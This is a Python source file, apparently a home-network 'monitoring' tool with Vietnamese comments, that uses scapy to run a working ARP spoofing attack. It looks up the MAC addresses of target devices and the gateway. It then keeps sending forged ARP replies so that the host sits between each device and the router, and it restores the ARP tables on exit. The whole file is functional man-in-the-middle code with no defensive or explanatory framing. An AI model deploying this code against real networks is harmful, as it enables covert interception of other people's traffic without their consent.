# arp_spoofer.py
import scapy.all as scapy
import time

def get_mac(ip):
    """Lấy địa chỉ MAC của một IP"""
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except Exception:
        pass
    return None

def restore(destination_ip, source_ip, dest_mac, src_mac):
    """Khôi phục bảng ARP về trạng thái chuẩn"""
    if dest_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)

def start_arp_spoof(target_ips, gateway_ip, stop_event):
    if not target_ips:
        print("[-] ARP Spoofer: Không có thiết bị mục tiêu nào để giám sát.")
        return

    print(f"[+] ARP Spoofer: Bắt đầu giám sát song song {len(target_ips)} thiết bị...")
    
    # Tạo Cache lưu MAC
    mac_cache = {}
    for ip in target_ips:
        mac = get_mac(ip)
        if mac:
            mac_cache[ip] = mac
            
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac:
        mac_cache[gateway_ip] = gateway_mac

    while not stop_event.is_set():
        for target_ip in target_ips:
            try:
                target_mac = mac_cache.get(target_ip)
                g_mac = mac_cache.get(gateway_ip)
                
                if target_mac and g_mac:
                    # Nói với Thiết bị rằng máy Linux là Router
                    pkt1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                    scapy.send(pkt1, verbose=False)
                    
                    # Nói với Router rằng máy Linux là Thiết bị
                    pkt2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=g_mac, psrc=target_ip)
                    scapy.send(pkt2, verbose=False)
            except Exception:
                pass
        time.sleep(3) # Giãn cách 3 giây để máy Linux không bị quá tải

    # Khôi phục mạng khi tắt chương trình
    print("\n[*] ARP Spoofer: Đang khôi phục bảng ARP cho toàn bộ thiết bị trong nhà...")
    g_mac = mac_cache.get(gateway_ip)
    for target_ip in target_ips:
        target_mac = mac_cache.get(target_ip)
        try:
            restore(target_ip, gateway_ip, target_mac, g_mac)
            restore(gateway_ip, target_ip, g_mac, target_mac)
        except Exception:
            pass
